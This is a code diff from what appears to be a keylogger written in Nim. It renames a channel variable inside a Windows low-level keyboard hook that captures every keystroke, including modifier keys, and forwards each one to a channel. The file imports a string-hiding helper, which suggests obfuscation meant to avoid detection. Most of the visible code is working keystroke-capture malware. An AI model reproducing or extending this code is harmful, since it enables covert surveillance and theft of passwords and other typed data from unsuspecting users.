@@ -38,7 +38,7 @@ from winim/utils import winimConverterBOOLToBoolean
 
 import ../functions/hideString
 
-from ../channels import mainThread
+from ../channels import mainChannel
 
 ## sursa: http://www.kbdedit.com/manual/low_level_vk_list.html
 const keys = {
@@ -249,7 +249,7 @@ proc keyboardHandler(nCode: int32, wparam: WPARAM, lparam: LPARAM): LRESULT {.st
     let keyText: string = d keys[kbs.vkCode]
 
     if wparam == WM_KEYDOWN or wparam == WM_SYSKEYDOWN:
-      mainThread.send keyText
+      mainChannel.send keyText
 
     elif wparam == WM_KEYUP or wparam == WM_SYSKEYUP:
       if key == VK_CONTROL or key == VK_LCONTROL or key == VK_RCONTROL or
@@ -259,7 +259,7 @@ proc keyboardHandler(nCode: int32, wparam: WPARAM, lparam: LPARAM): LRESULT {.st
           key == VK_RWIN:
         var KeyName: string = keyText
         KeyName.insert("/", 1) # insert like [SHIFT] [a] [b] [/SHIFT]
-        mainThread.send KeyName
+        mainChannel.send KeyName
 
   result = CallNextHookEx(0, nCode, wparam, lparam)
 
